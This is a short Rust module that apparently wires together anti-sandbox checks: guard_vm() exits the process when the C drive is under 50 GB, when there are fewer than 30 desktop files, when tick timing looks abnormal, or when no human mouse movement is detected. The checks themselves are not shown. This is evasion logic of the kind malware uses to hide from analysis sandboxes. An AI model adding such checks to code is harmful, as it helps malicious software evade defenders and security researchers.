#[cfg(feature = "sandbox")]
use std::process;

#[cfg(feature = "vm_check_tick")]
mod tick;
#[cfg(feature = "vm_check_tick")]
pub use crate::guard::tick::is_tick_abnormal;

#[cfg(feature = "vm_check_mouse")]
mod mouse;
#[cfg(feature = "vm_check_mouse")]
pub use crate::guard::mouse::has_human_mouse_movement;

#[cfg(feature = "vm_check_desktop_files")]
mod desktop_files;
#[cfg(feature = "vm_check_desktop_files")]
pub use crate::guard::desktop_files::check_desktop_files;


#[cfg(feature = "vm_check_c_drive")]
mod c_drive;
#[cfg(feature = "vm_check_c_drive")]
pub use crate::guard::c_drive::is_c_drive_total_over;


#[cfg(feature = "sandbox")]
pub fn guard_vm() {
    #[cfg(feature = "vm_check_c_drive")]
    let c_min_gb: u64 = 50;
    #[cfg(feature = "vm_check_desktop_files")]
    let desktop_min: usize = 30;

    #[cfg(feature = "vm_check_c_drive")]
    if !is_c_drive_total_over(c_min_gb) { process::exit(1); }
    #[cfg(feature = "vm_check_desktop_files")]
    if !check_desktop_files(desktop_min) { process::exit(1); }
    #[cfg(feature = "vm_check_tick")]
    if is_tick_abnormal() { process::exit(1); }
    #[cfg(feature = "vm_check_mouse")]
    if !has_human_mouse_movement() { process::exit(1); }
}



